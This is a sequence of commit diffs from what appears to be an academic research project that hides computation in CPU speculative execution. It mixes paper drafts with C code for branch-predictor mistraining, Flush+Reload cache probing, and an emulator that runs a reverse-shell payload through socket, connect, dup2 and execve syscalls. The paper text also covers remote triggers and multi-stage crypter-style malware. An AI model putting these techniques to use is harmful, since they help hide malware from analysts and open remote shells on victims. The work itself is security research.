 our payload program. Our program jumps to the source address of a pair,
-which has a single \texttt{retq} instruction, which pops the next
-destination off the stack and performs the indirect jump. At each destination
-address, we place a static (direct) \texttt{jmpq} to bring execution to the
-next source address in our list. The final jump source/destination pair is not
+which has a single \texttt{retq} instruction that pops the next
+destination off the stack, performing the indirect jump. At each destination
+address, we place another static (direct) \texttt{jmpq} to bring execution to the
+next source address in our list. The last jump source/destination pair is not
 performed (and its destination is not pushed to the stack). However, we place
-our gadget code at the destination address, which finishes by loading a specific value
-into the cache.
-The last source in the 31 indirect jumps performs an indirect jump that returns to our
+our gadget code at the destination address, which, when executed speculatively,
+loads a specific value into the cache.
+The ``true'' destination of the last indirect jump returns to our
 payload program, which immediately times probing the cache to see if any value was
@@
 We induced the jump pattern in OpenSSL by running Apache benchmark against it to
-generate thousands of connections, using the ECDHE key exchange with the
+generate thousands of TLS connections using the ECDHE key exchange with the
 secp256r1 curve (ECDHE-RSA-AES256-GCM-SHA384). When running Apache benchmark locally, our payload program
 reliably achieves a 3.5\% hit rate. When apache benchmark runs on a remote
-machine, the hit rate drops to approximately 2.0\%. Nonetheless, this is
-sufficient to perform computation, as we simply perform thousands of iterations
+machine, the hit rate drops to approximately 2.0\%. Nonetheless, these are both
+sufficient to perform computation, though we must perform a greater number of
+speculative iterations
 to extract results from the speculative world before updating any real world state.
 
-We verified that our payload program did not observe any cache loads when we ran
+We verified that our payload program did not observe any cache loads (0\% hit
+rate) when we ran
 other programs that consumed CPU on the same core. In addition, when we used

### 2018-05-10 turing/plots.py
remove axis coloring

@@ -93,7 +93,7 @@ maxes = [10*i for i in maxes]
 means = [10*i for i in means]
 
 color = "tab:red"
-ax2.set_ylabel("Average time (s) to reach 1 million instructions",color=color)
+ax2.set_ylabel("Average time (s) to reach 1 million instructions")
 ax2.plot(numJumps, means, color=color,label="Average time", linewidth=3.0)
 ax2.tick_params(axis="y", labelcolor=color)
 

### 2018-06-21 measure.c
Working AMD version -- added randomized probe array access

@@ -66,17 +66,17 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
-        asm volatile( "movb (%%rbx), %%al\n"
-            :: "b"(addr) : "rax");
+        asm volatile( "movb (%%rbx), %%al\n" :: "b"(addr) : "rax");
         t1 = _rdtscp(&junk);
-        if (t1-t0 < 140) {
+        if (t1-t0 < 150) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
         }
     }
     tot_runs++;
@@ -172,6 +172,7 @@ void measure() {
 
     int misses = 0;
     uint64_t k = 1;
+    uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
     uint64_t final_i;
@@ -192,8 +193,8 @@ void measure() {
         hit_miss = get_top_k(k, top_k_i, top_k_res);
 
         if (hit_miss){
-            final_i = construct_result(k, 8, top_k_i); 
-            printf("[%08lX] - cache hits: %ld\n\n", final_i, cache_hits);
+            final_i = construct_result(k, width, top_k_i); 
+            printf("[%08lX]  - Cache Hits: %ld  -- avg:%ld\n\n", final_i, cache_hits, cache_hits/2000);
 
             signal_idx++;
             misses = 0;

### 2018-06-21 target_fn.c

@@ -76,7 +76,7 @@ void signal40(uint64_t state)
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
-    asm volatile (
+    /* asm volatile (
         ".rept 0x6; nop; .endr\n"
     "target_fn_start:"
 
@@ -92,10 +92,11 @@ void target_fn(void)
         "nop;nop;nop;nop;nop;nop\n" // cover (pop %rax; call 1f;)
         
         ".endr\n"
-        :::"rax", "rcx", "rdx");  
+    :::"rax", "rcx", "rdx");  
+    */
 
 
-    // signal(0x11);               // in measure k = 1, width=8;
+    signal(0x11);               // in measure k = 1, width=8;
     // signal32(0xDEADBEEF);    // in measure k = 4, width=8
     // signal40(0xDEADBEEF44);  // in measure k = 8, width=5
 

### 2018-06-21 measure.c
Working on AMD -- added check probe access randomization

@@ -66,17 +66,17 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+		mix_i = ((i* 167) +13) & NUM_PROBES-1;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
-        asm volatile( "movb (%%rbx), %%al\n"
-            :: "b"(addr) : "rax");
+        asm volatile( "movb (%%rbx), %%al\n" :: "b"(addr) : "rax");
         t1 = _rdtscp(&junk);
-        if (t1-t0 < 140) {
+        if (t1-t0 < 150) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
         }
     }
     tot_runs++;
@@ -172,7 +172,7 @@ void measure() {
 
     int misses = 0;
     uint64_t k = 1;
-    uint64_t width = 10;
+    uint64_t width = 8;
     uint64_t top_k_i[k]; 
     uint64_t top_k_res[k]; 
     uint64_t final_i;
@@ -181,7 +181,7 @@ void measure() {
     while (1) {
         for (i=0; i<MAX_ITERATIONS; i++) {
             _mm_clflush(&fn_ptr);
-            _mm_clflush(&jmp_ptr);
+            //_mm_clflush(&jmp_ptr);
             indirect(&jmp_ptr);
             //((void(*)(void *))map)(&jmp_ptr);
             usleep(1);
@@ -194,7 +194,7 @@ void measure() {
 
         if (hit_miss){
             final_i = construct_result(k, width, top_k_i); 
-            printf("[%08lX]\n\n", final_i);
+            printf("[%08lX]  - Cache Hits: %ld  -- avg:%ld\n\n", final_i, cache_hits, cache_hits/2000);
 
             signal_idx++;
             misses = 0;

### 2018-06-21 target_fn.c

@@ -94,7 +94,7 @@ void target_fn(void)
 
 
 
-    // signal(0x11);
+    signal(0x11);
     // signal(0x23);
     // signal(0x37);
     // signal32(0xDEADBEEF);
@@ -103,8 +103,8 @@ void target_fn(void)
     // __uint128_t register pt = aes_ctr(signal_idx / 16);
     // signal(pt >> ((signal_idx % 16)*8) & 0xff);
 
-    __uint128_t register pt = aes_ctr(signal_idx / 4);
-    signal32(pt >> ((signal_idx % 4)*32));
+    // __uint128_t register pt = aes_ctr(signal_idx / 4);
+    // signal32(pt >> ((signal_idx % 4)*32));
 
 }
 

### 2018-06-21 emulator/full_emulator.c
emulator now runs C rev-shell

@@ -176,7 +176,7 @@ static void hook_syscall(uc_engine *uc, void *user_data)
     // }
     switch((int)r7) {
         case 0x1:
-            opcode = 60;
+            opcode = 0x3c;
             break;
         case 0x4:
             opcode = 1;
@@ -199,8 +199,37 @@ static void hook_syscall(uc_engine *uc, void *user_data)
             // printf("new r0 = 0x%02lx\n", r0);
             break;
         case 0x119:
+            //socket (no pointers)
             opcode = 0x29;
+            r0 = (int) r0;
+            r1 = (int) r1;
+            r2 = (int) r2;
             break;
+        case 0x11b:
+            //connect
+            opcode = 0x2a;
+            p = p + ((int) r1 - ADDRESS);
+            r0 = (int) r0;
+            r1 = (uint64_t) p;
+            r2 = (int) r2;
+            break;
+        case 0x3f:
+            //dup2 (no pointers)
+            opcode = 0x21;
+            r0 = (int) r0;
+            r1 = (int) r1;
+            break;
+        case 0x0b:
+            //execve
+            opcode = 0x3b;
+            r0 = (uint64_t) (p +((int)r0 - ADDRESS));
+            if (r1 != 0)
+                r1 = (uint64_t) (p +((int)r1 - ADDRESS));
+            if (r2 != 0)
+                r2 = (uint64_t) (p +((int)r2 - ADDRESS));
+            break;
+            
+
     }
 
     printf("Executing syscall: 0x%x\n", opcode);
@@ -236,6 +265,7 @@ static void hook_syscall(uc_engine *uc, void *user_data)
         "movq %q[r5], %%r9\n"
         "movq %q[opcode], %%rax\n"
         "syscall\n"
+        "movq %%rax, %0\n"
         : "=r" (ret)
         : [r0] "r" (r0), [r1] "r" (r1), [r2] "r" (r2), [r3] "r" (r3), [r4] "r" (r4), [r5] "r" (r5), [opcode] "r" (opcode)
         : "rdi", "rsi", "rdx", "r10", "r8", "r9", "rax");

### 2018-06-21 paper/appendix_spasm.tex
VM implementation updates
target fn translated to speculative gadget

@@
 The progamming model used by SPASM builds up values on the maintained stack
-and stores values in specially reserved offsets equivalent to x86 registers 
-in order to perform system calls. Immediates can be assigned into VAL
-incrementally, and stored, operated on, or pushed onto the maintained
-stack. Control Flow, including conditional jmps, is implemented by modifying 
-the maintained instruction pointer SRIP.
+and stores them in specially reserved offsets equivalent to x86 registers 
+in order to perform system calls. Using the \texttt{UVAL} instruction
+an immediate can be assigned into the lowest 4 bits of VAL, which 
+can subsequenty be shifted to allow futher bits to be entered. In this way
+immediates can be built up incrementally, stored, operated on, or pushed 
+onto the maintained stack. Control Flow, including conditional jumps, 
+is implemented by modifying the maintained instruction pointer SRIP.
 
 Using this we have implemented various example programs including 
-\textit{HelloWorld}, \textit{FizzBuzz}, and \textit{DialbackShell}.
+\textit{HelloWorld}, \textit{FizzBuzz}, and \textit{ReverseShell}.
 See Figure~\ref{fig:spasm_model} for a diagram of the SPASM emulator's
-usage within the \speculake model.
+usage in an \speculake application.
 

### 2018-06-21 paper/architecture.tex

@@
 
+\subsubsection{Nested Speculation}
+
+We explore the ability for the CPU to ``double speculate'', where a second
+stalled indirect jump while the CPU is already speculating causes it to predict
+the target and
+speculate a second time. For instance, suppose a payload program truly jumps to
+target A, but the CPU is mistrained by a trigger program that jumps to B, thus
+causing the payload program to speculatively execute at B. At B, suppose there
+is a second indirect jump, perhaps using the same register as the first jump
+(which has still not resolved). If the trigger program jumps to C, the payload
+program will speculate a second time and continue speculative execution at C.
+
+We find that not all Intel CPUs support nested speculation. For
+example, it appears Haswell chips do not speculate while already speculating,
+but nonetheless support non-nested \speculake. Both Sandy Bridge (which
+preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
+speculation. We find that when a CPU does support nested speculation, there
+appears to be no limit to nested depth besides the speculative instruction
+limit. We use a 16-deep nested speculation in Section~\ref{subsec:impl-aes}
+to thoroughly protect speculative decryption keys from reverse
+engineering.
+
 \subsection{Speculative Primitive}

### 2018-06-21 paper/background.tex
partial related work, and bib fixes across paper

@@
 In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
+attacker to leak information from a victim
+program~\cite{spectre,project_zero,maisuradze2018speculose}. Spectre uses the
+fact that speculative execution can influence system state via side channel. In
+Spectre, an attacker mistrains the branch predictor of a CPU running a victim
+program by providing inputs to it. Once mistrained, the attacker then sends a
+new input that will cause a different in-order execution path. However, because
+the CPU's branch predictor has been mistrained, it will still speculatively
+execute the previous path.
 

### 2018-06-21 paper/conclusion.tex

@@
 
-In this paper we have presented \speculake, a model for hiding computation in
-speculative execution that is fundamentally different than modern methods of
-obfuscating computation. Through a series of experiments we have classified the
+%In this paper 
+We have presented \speculake, a model for hiding computation in
+speculative execution that is fundamentally different than existing methods of
+code obfuscation. Through a series of experiments we have classified the
 capabilities and limitations of this speculative primitive and demonstrated
-various example applications. We have demonstrated the widely varying
-capabilities of speculative execution, in particular showing that it allows for
-arbitrary computation from a Turing Machine, emulation, transparent and remote
-communication, and process level data encryption. As a result current analysis
-techniques for detecting process cooperation, and describing the behavior of
-program binaries are no longer definitively reliable.
+various example applications. We have demonstrated the potential
+of using speculative execution in several applications, including a Turing
+machine, SPASM emulator, remotely-triggered payloads, and AES decryption.
+Currently analysis techniques for reverse engineering are insufficient to reason
+about the behavior of these programs.
 
@@
 
-Software isolation techniques are critical in protecting against exploitation
-models, however, complex optimization has often neglected these principles in
-favor of performance. The stop-gap measures proposed in this work contain
-security and performance trade-offs, though we advocate for a more robust
-solution in future processor generations. Long term solutions may require that
-we take a step backward before we can securely step forward.
+Ultimately, silicon and microarchitecture patches will be needed to secure CPUs
+against this kind of malware. Meanwhile, attackers may
+iterate and find new variants of \speculake-like malware.
+In the meantime, new detection techniques and
+software-level mitigations are desperately needed.
+
+%Software isolation techniques are critical in protecting against exploitation
+%models, however, complex optimization has often neglected these principles in
+%favor of performance. The stop-gap measures proposed in this work contain
+%security and performance trade-offs, though we advocate for a more robust
+%solution in future processor generations. Long term solutions may require that
+%we take a step backward before we can securely step forward.
+%

### 2018-06-21 paper/figures.tex

@@
 
-    \caption{The number of instructions and error rate of a the 5-state Busy
+    \caption{The number of steps and error rate of a the 5-state Busy
             Beaver configuration were measured as a function of how many
             (redundant) iterations into the speculative world were performed. As
-            expected, the amount of time to complete a million instructions is a
+            expected, the amount of time to complete a million steps is a
             linear function of how many indirect calls into the speculative
             world we take. Additionally we see that it only requires using 10
-            speculative calls per instruction to achieve a very low number of
-            errors in reaching a million instructions, making 10-20 iterations
+            speculative calls per step to achieve a very low number of
+            errors in reaching a million instructions, making 10-20 steps
             an attractive choice for most applications.}

### 2018-06-21 paper/implementation.tex

@@
 
-In this model of computation there are no instruction arguments, as we must
+In this model of computation there are effectively no instruction arguments, as we must
 return an entire instruction from the speculative world inside the limited-width
@@
 
-We have used 6 bits in the construction of this instruction set as our
+We used 6 bits in the construction of this instruction set as our
 goal is to limit the length of each opcode as much as possible. Note that this
 is different from the goal in maximizing bandwidth, as our goal now is to
-maximize instruction throughput.
+maximize instruction throughput. Given our short instructions, loading values into registers
+requires shifting in 4-bits at a time. SPASM has two registers that act as a
+pointer and working register, that can be used to perform jumps, arbitrary
+memory reads and writes, and basic arithmatic. We also have a \texttt{syscall}
+instruction that makes a real system call to the underlying operating system
+with parameters loaded from the SPASM state, allowing us to interact with the
+real world. Details of
+the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
 
-In SPASM we have implemented multiple example programs that can be run as
-encrypted binaries in an \speculake payload: First, a \textit{HelloWorld}
+In SPASM we have implemented multiple example programs that we encrypted and
+loaded into a \speculake payload, which decrypts and emulates SPASM instructions
+only when the corresponding trigger program is running.
+We first implemented a \textit{HelloWorld}
 program that prints to \texttt{stdout}. Next, a \texttt{FizzBuzz} program that
 demonstrates control flow and arithmetic operations while printing to stdout.
-And finally, a \textit{ReverseShell} program that opens and connects to a socket
-before  duplicating I/O file descriptors and executing a local shell. Details of
-the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}. Figure~\ref{fig:spasm_model} details the high-level flow of a SPASM payload.
+Finally, we implemented a \textit{ReverseShell} program that opens and connects to a socket
+before duplicating I/O file descriptors and executing a local shell.
+Figure~\ref{fig:spasm_model} details the high-level flow of a SPASM payload.
 
-Expected performance for a given SPASM binary will vary given multiple factors,
-the most important of which is the \texttt{Flush+Reload} redundancy. This can be
-tuned based on the specific trigger, as it is used to establish confidence that
-a signal has been identified in the indices returned from the "speculative
-world". 
+%Expected performance for a given SPASM binary will vary given multiple factors,
+%the most important of which is the \texttt{Flush+Reload} overhead. This can be
+%tuned based on the specific trigger, as it is used to establish confidence that
+%a signal has been identified in the indices returned from the "speculative
+%world". 
 %Thus accomplishing a task using SPASM generally equates to:
@@
 
-For example, the \textit{ReverseShell} program is 355 SPASM instructions, and
+Our \textit{ReverseShell} program consists of 355 SPASM instructions, and
 makes six system calls to open a socket,
@@
 
-Benign programs can act as a trigger program, provided they perform sufficient
+Benign programs can also act as a trigger program, provided they perform sufficient
 indirect jumps to train the branch predictor. We experiment using the OpenSSL

### 2018-06-21 paper/introduction.tex

@@
 computation by implementing a reverse shell in our speculative instruction set.
-We show that this simple payload is able to perform several system calls
-in a reasonable time, ultimately launching a dial-back TCP shell in under 7~seconds after
-the trigger program starts.
+We show that this simple payload is able to perform several system calls in a
+reasonable time, ultimately launching a dial-back TCP shell in just over
+2~milliseconds after the trigger program starts.
 

### 2018-06-21 paper/payloads.tex
implementation pass

@@
 the real world keeps track of the state, tape, and symbols of the turing machine
-all logic used to update the above is done in the speculative world.
+all logic used to update the above is done in the speculative world. Figure~\ref{fig:general_model} demonstrates the execution flow of a sample \speculake malware.
 
@@
 
-\subsubsection{Nested Speculation}
-
-We explore the ability for the CPU to ``double speculate'', where a stalled
-indirect jump while the CPU is speculating causes it to predict the target and
-speculate a second time. For instance, suppose a payload program truly jumps to
-target A, but the CPU is mistrained by a trigger program that jumps to B, thus
-causing the payload program to speculatively execute at B. At B, suppose there
-is a second indirect jump, perhaps using the same register as the first jump
-(which has still not resolved). If the trigger program jumps to C, the payload
-program will speculate a second time and also begin executing code at C.
-
-We find that not all Intel CPUs support nested speculation. For
-example, it appears Haswell chips do not speculate while already speculating,
-but nonetheless support non-nested \speculake. Both Sandy Bridge (which
-preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
-speculation.
 % Could cut
-We leverage this support in Section~\ref{subsec:decryption} to
-increase the security of speculative decryption keys.
-
+%We leverage this support in Section~\ref{subsec:decryption} to
+%increase the security of speculative decryption keys.
+%
 %There are numerous challenges for a reverse engineer to overcome to learn how a
@@
 emulation by a light-weight SPASM emulator. Using SPASM, developers can write
-programs, and assemble and encrypt them into a payload program. When the
+programs, assemble and encrypt them into a payload program. When the
 associated trigger program runs, the payload will decrypt SPASM instructions in

### 2018-06-21 paper/triggers.tex

\section{Trigger Programs}
Easy answer: custom program that mistrains branch predictor

\subsection{Benign Triggers}
Could also be any program on the system, and potentially remote!

\subsection{Complex Triggers}
When considering packers and crypters used in modern malware it is not uncommon to see 
a malicious sample packed using multiple stages with different unpacking conditions. 
Whether that be red pills, or environent checks, or network triggers, the reliance is on
complexity to fool any reverse engineer out of finding the correct conditions to 
release the full payload.

Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
can be designed used any combination of crafted or benign trigger programs. Only when all
stages have been run to completion in order will the malicious payload be revealed.  
In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
they can use differnt emulators all together.

Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
with the keys hidden in data or dead code which static and dynamic reverse engineering 
methods will overlook.

%%%%%%%%%%%%%%

### 2018-06-26 paper/architecture.tex
minor fixes including spelling and phrasing requests from reviewers

@@
 \texttt{xchg \%rax, \%rax} and \texttt{xor \%rax, \%rax}. However, if an
-instruction is a potential data hazard, it must use an entry in the PRF until it
-reaches the correct stage in the execution pipeline. In this case, the number of
-instructions could be limited by the PRF entries available.
+instruction is a potential data hazard, it must use an entry in the Physical 
+Register File (PRF) until it reaches the correct stage in the execution pipeline. 
+In this case, the number of instructions could be limited by the PRF
+entries available.
 

### 2018-06-26 paper/discussion.tex
minor fixes including spelling and phrasing requests from reviewers

@@
 
-\texttt{Guest1 -> Guest1}---When both trigger and payload are run internal to a
+\texttt{Guest1 -> Guest1}---When both the trigger and payload are run internal to a
 single virtual machine the branch prediction is successfully trained in the
@@
 
-\texttt{Guest -> Host}---In a configuration where trigger runs on the guest
+\texttt{Guest -> Host}---In a configuration where the trigger runs on the guest
 while the payload runs on the host we have found that \speculake also
-successfully trains the branch predictor well enough retreive a signal. Again,
-this signal is significantly reduced, implying the hypercall context swtich from
+successfully trains the branch predictor well enough retrieve a signal. Again,
+this signal is significantly reduced, implying the hypercall context switch from
 guest to host requires some overhead. We note that processor affinity in a guest
@@
 
-\texttt{Host -> Guest}---When trigger runs on the host attempting to train the
+\texttt{Host -> Guest}---When the trigger program executes on the host
+attempting to train the
 branch predictor to influence a payload process in a guest we have found that
@@
 from the host to the guest is heavier and has a larger impact on branch history.
-This matches with work done by the Project Zero team at Google which found that
-hypervisors can be fingerprinted from within a VM using the branch
-predictor~\cite{project_zero}.
+This is also supported by the fact that hypervisors can be fingerprinted from 
+within a VM using the branch predictor as demonstrated by the Project Zero 
+team at Google~\cite{}.
+~\cite{project_zero}.
 
-\texttt{Guest1 -> Guest2}---Configurations where trigger and payload run on
+\texttt{Guest1 -> Guest2}---Configurations where the trigger and payload run on
 co-resident virtual machines similarly show no signal for the same reasons that
@@
 promising direction for future investigation as various system libraries present
-juicy targets for trigger design. For exmaple, if a sufficient series of jumps
+juicy targets for trigger design. For example, if a sufficient series of jumps
 is found to exist in the TCP stack implemented in the UNIX kernel (i.e. in the

### 2018-06-26 paper/related-work.tex
minor fixes including spelling and phrasing requests from reviewers

@@
 The term \textit{weird machine} comes from work done by Bratus \textit{et al.}
-composing bugs and features of a system to create arbitrary compuatation with
+composing bugs and features of a system to create arbitrary computation with
 interesting properties~\cite{weird_machines,bratus2011exploit,weird_exploits}.

### 2018-06-26 spasm/emulator/process_v.c
old work in incomplete state storing for future cleanup

@@ -1,0 +1,75 @@
+
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#include "spasm.h"
+
+
+State state; 
+
+uint_reg *R;
+
+
+void run(int num_instr) {
+    Instruction * instr;
+    uint_reg rip = *(R+SRIP_OFFSET);
+
+    while (true) {
+        rip = *(R+SRIP_OFFSET);
+
+        printReg((R+SRIP_OFFSET),  "SRIP ");
+        printReg((R+VAL_OFFSET),   "VAL  "); 
+        printReg((R+PTR_OFFSET),   "PTR  "); 
+        // if (( state.instr[ rip ] == 0x1A )  || ( state.instr[ rip ] == 0x1B ) || ( state.instr[ rip ] == 0x11 ) || ( state.instr[ rip ] == 0x13 ))  {
+        //    printRegs(R, 3);
+        // }
+        // if ( state.instr[ rip ] == 0x1F ) {
+        //     printRegs(R, 3);
+        // }
+        // if ( state.instr[ rip ] == 0x00 ) {
+        //     break;
+        // }
+
+        instr = getInstruction(state.instr[rip]);
+        printInstr(instr);
+        update(R, state.instr[ rip ]);
+        usleep(250000);
+    }
+}
+
+int setup(char *fname){
+    uint8_t instr;
+    FILE *finstr = fopen(fname, "r");
+    int i =0; 
+
+    // Parse spasm instructions out of file into state text section
+    while (fread(&instr, 1, 1, finstr) == 1) {
+        // printInstr(getInstruction((uint8_t)instr));
+        state.instr[i] = (uint8_t)instr;
+        i++;
+    }
+
+    initState(&state);
+    R = state.regs;
+    return i;
+}
+
+
+int main(int argc, char *argv[] ){
+    // printISA();
+    int x =0; 
+    // char *fname = "./examples/hello.sp";
+    char *fname;
+
+    if (argc < 2){
+        printf("No SPASM file specified\n\t> ./process <spasm.sp>\n\n");
+        exit(1);
+    }
+    fname = argv[1];
+    
+    x = setup(fname);
+    run(x);
+}

### 2018-06-26 spasm/spasm.c

@@ -31,7 +31,7 @@ Instruction* getInstruction(uint8_t instr) {
 
 void initState(State *state){
     state->regs[SRIP_OFFSET] = 0;
-    state->regs[SRSP_OFFSET] = STK_OFFSET;
+    state->regs[SRSP_OFFSET] = state->regs + STK_OFFSET;
 }
 
 void printInstr(Instruction *instr) {
@@ -280,6 +280,8 @@ void doSyscall(uint_reg *R) {
     // Integer Value returned from Syscall 
     
     // Syscall
+    printRegs(R, 4);
+
     asm volatile (
     #if defined(ENV64)
         "syscall\n"
@@ -307,26 +309,35 @@ void doSHLReg(uint_reg *R) {
 }
 
 void doPushReg(uint_reg *R){
+    uint_reg * srsp_p = R+SRSP_OFFSET;
     uint_reg * val_p  = R+VAL_OFFSET;
-    uint_reg * stk_p = R+(int)*(R+SRSP_OFFSET);
-    // printf("Push: ADDR %016lX - VAL %lX\n", (uint_reg)stk_p, *(val_p));
+    uint_reg * stk_p = *(srsp_p);
+
+    printRegs(R, 4);
+
     *(stk_p) = *(val_p);
-    *(R+SRSP_OFFSET) +=1; 
+    *(srsp_p) +=BYTES_PER_REG; 
+
+    printRegs(R, 4);
 }
 
 void doPopReg(uint_reg *R){
-    *(R+SRSP_OFFSET) -=1; 
     uint_reg * srsp_p = R+SRSP_OFFSET;
     uint_reg * val_p = R+VAL_OFFSET;
-    uint_reg * stk_p = R+(int)*(R+SRSP_OFFSET);
-    // printf("Pop: ADDR %016lX - VAL %lX\n", (uint_reg)stk_p, *(stk_p));
-    if ( *(srsp_p) < STK_OFFSET){
+    uint_reg * stk_p = *(srsp_p);
+
+    printRegs(R, 4);
+
+    *(srsp_p) -=BYTES_PER_REG; 
+    if ( stk_p <= R+STK_OFFSET){
         // Stack is Empty
         // printf("Stack is empty\n");
         *(val_p) = 0x0;
         return;
     }
     *(val_p) = *(stk_p);
+
+    printRegs(R, 4);
 }
 
 void doClrReg(uint_reg *R){
[…]

### 2018-06-26 spasm/spasm32_test.c

@@ -141,13 +141,14 @@ void test_Pointers(){
 void test_PushPop(){
     printf("------[ Test Push Pop PrintRegs ]-------\n");
     uint_reg R_mock[16] = {9,9,0,0,0,0,0,0,0,0,0, 0,0,0,0,0};
-    uint_reg *R_p = &(R_mock[2]);
+    uint_reg *R_p = &(R_mock);
     uint8_t step = 0x0;
     
     for (step=0; step < 8; step++){
-        doUpdateReg(R_p, step);
-        doSHLReg(R_p);
+        doUpdateReg(R_mock+VAL_OFFSET, step);
+        doSHLReg(R_mock+VAL_OFFSET);
     }
+    R_mock[SRSP_OFFSET] = R_mock + STK_OFFSET;
     printf("Push R: 0x%X\n", *R_p);
     doPushReg( R_p );
     printRegs(R_p, 4);
@@ -155,10 +156,10 @@ void test_PushPop(){
     doPushReg( R_p );
     
     for (step=0xf; step >8 ; step--){
-        doUpdateReg(R_p, step);
-        doSHLReg(R_p);
+        doUpdateReg(R_p+VAL_OFFSET, step);
+        doSHLReg(R_p+VAL_OFFSET);
     }
-    printf("Push R: 0x%X\n", *R_p);
+    printf("Push R: 0x%X\n", *R_p+VAL_OFFSET);
     doPushReg( R_p );
     printRegs(R_p, 6);
     doPopReg(R_p);
@@ -166,7 +167,7 @@ void test_PushPop(){
     doPopReg(R_p);
     printRegs(R_p, 6);
      
-    for (step=0; step < 8; step ++){doSHLReg(R_p);}
+    for (step=0; step < 8; step ++){doSHLReg(R_p+VAL_OFFSET);}
     doPushReg(R_p);
     doPushReg(R_p);
     doPushReg(R_p);
@@ -178,6 +179,7 @@ void test_PushPop(){
     doPopReg(R_p);
     doPopReg(R_p);
     printRegs(R_p, 4);
+    printf(";-;-    ;-;-;--;-;-;;;-;`-;`-;`-;`-;`-;`-;`-;`-`;-`;\n");
 }
 
 
@@ -226,12 +228,12 @@ int test_generic(){
 
 int main(){
     test_printISA_short();
-    test_ControlFlow();
+    //1 test_ControlFlow();
     //1 test_printISA();
     //1 test_asmSyscall();
[…]

### 2018-06-26 spasm/spasm_test.c

@@ -136,14 +136,15 @@ void test_Pointers(){
 
 void test_PushPop(){
     printf("------[ Test Push Pop PrintRegs ]-------\n");
-    uint_reg R_mock[16] = {9,9,0,0,0,0,0,0,0,0,0, 0,0,0,0,0};
+    uint_reg R_mock[16] = {0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0};
     uint_reg *R_val = &(R_mock[VAL_OFFSET]);
     uint8_t step = 0x0;
     
 
+    R_mock[SRSP_OFFSET] = R_mock + STK_OFFSET;
     R_mock[SRIP_OFFSET] = 0x18;
-    R_mock[SRSP_OFFSET] = STK_OFFSET;
     R_mock[VAL_OFFSET] = 0xDEADBEEF12345678;
+    printRegs(R_mock, 1);
 
     printf("Push R: 0x%lX\n", *R_val);
     update(R_mock, 0x1B);   // Push VAL
@@ -247,7 +248,7 @@ int main(){
     //1 test_doSyscall_write();
     //1 test_changeRegs();
     //1 test_Pointers();
-    //1 test_PushPop();
+    test_PushPop();
     // test_generic();
 }
     

### 2018-06-26 turing.c

@@ -6,7 +6,15 @@
 #include <unistd.h>
 #include <string.h>
 #include <sys/mman.h>
+<<<<<<< Updated upstream:turing.c
 #include "common.h"
+=======
+#include <time.h>
+#include "../common.h"
+#include "../spasm/emulator/spasm.h"
+>>>>>>> Stashed changes:spasm_vm/spasm_vm.c
+
+#define BILLION  1000000000L;
 
 // Defines the bandwidth we can communicate
 // from speculative -> von neuman
@@ -89,11 +97,16 @@ void check_probes() {
 
 uint64_t jmp_ptr;
 
+<<<<<<< Updated upstream:turing.c
 
 #define TURING_TAPE_LEN 1024*512
 uint8_t *turing_tape;
 uint8_t turing_state;
 
+=======
+struct timespec start, stop;
+double accum;
+>>>>>>> Stashed changes:spasm_vm/spasm_vm.c
 void measure() {
     fn_ptr = check_probes;
     //jmp_ptr = 0x400e60;
@@ -106,7 +119,12 @@ void measure() {
     turing_state = 0;
 
     while (1) {
+<<<<<<< Updated upstream:turing.c
         for (i=0; i<50; i++) {
+=======
+        
+        for (i=0; i<5; i++) {
+>>>>>>> Stashed changes:spasm_vm/spasm_vm.c
             _mm_clflush(&fn_ptr);
             _mm_clflush(&jmp_ptr);
             indirect(&jmp_ptr);
@@ -124,6 +142,7 @@ void measure() {
             }
         }
 
+<<<<<<< Updated upstream:turing.c
         if (max_res > 10 && avg < 50){
             printf("[%lu]: %lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld\n", max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space);
             signal_idx++;
@@ -164,6 +183,17 @@ void measure() {
                 printf("halt state reached!\n");
                 exit(0);
             }
+=======
+        if (max_res > 2 && avg < 50){
+            // printf("[%02lX][%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
+            //           instr, max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
[…]

### 2018-07-26 paper/related-work.tex
trim related work section

@@
 
-The term \textit{weird machine} comes from work done by Bratus \textit{et al.}
-composing bugs and features of a system to create arbitrary computation with
-interesting properties~\cite{weird_machines,bratus2011exploit,weird_exploits}.
-This encompasses many traditional computer vulnerabilities including buffer
-overflows~\cite{buffer_overflow}, format string
-exploits~\cite{format_string_exploit}, and return oriented
-programming~\cite{shacham2007geometry}. These exploits demonstrate performing
